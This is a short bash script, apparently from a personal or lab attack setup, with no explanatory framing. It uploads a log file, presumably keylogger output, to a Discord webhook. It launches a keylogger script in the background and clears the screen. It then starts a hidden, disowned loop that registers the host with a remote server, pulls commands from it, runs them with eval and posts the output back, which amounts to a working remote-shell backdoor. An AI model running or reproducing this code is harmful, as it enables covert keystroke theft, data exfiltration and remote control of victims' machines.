#!/bin/bash 
curl -F "filename=@/home/dada/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
python3 /home/dada/Keylogger/linux/keylogger.py &
clear
nohup bash -c 's=10.10.10.16:8383&&i=5d8b89-6c5226-dcef4b&&hname=$(hostname)&&p=http://;curl -s "$p$s/5d8b89/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/6c5226" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/dcef4b -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
